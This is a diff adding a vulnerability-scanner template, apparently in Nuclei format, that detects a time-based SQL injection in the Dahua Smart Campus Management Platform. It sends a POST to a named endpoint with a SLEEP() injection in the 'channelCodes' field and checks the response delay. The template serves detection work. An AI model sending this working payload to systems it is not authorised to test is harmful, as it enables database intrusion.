@@ -1,0 +1,30 @@
+id: dahua-smart-campus-management-sql-injection
+info:
+  name: Dahua Smart Campus Management Platform SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in the Dahua Smart Campus Management Platform, exploiting the sleep function to delay responses.
+variables:
+  t1: "{{rand_int(5,10)}}"
+http:
+  - method: POST
+    path:
+      - "/CardSolution/card/accessControl/channelControl/channels?systime=1675860972982"
+    headers:
+      Content-Type: application/json; charset=UTF-8
+    body: |
+      {"channelCodes":["1') AND (SELECT 9938 FROM (SELECT(SLEEP({{t1}})))nLti) AND ('yYYm'='yYYm"]}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration > t1
+      - type: word
+        part: body
+        words:
+          - "\"errMsg\":\"success\",\"success\":true"
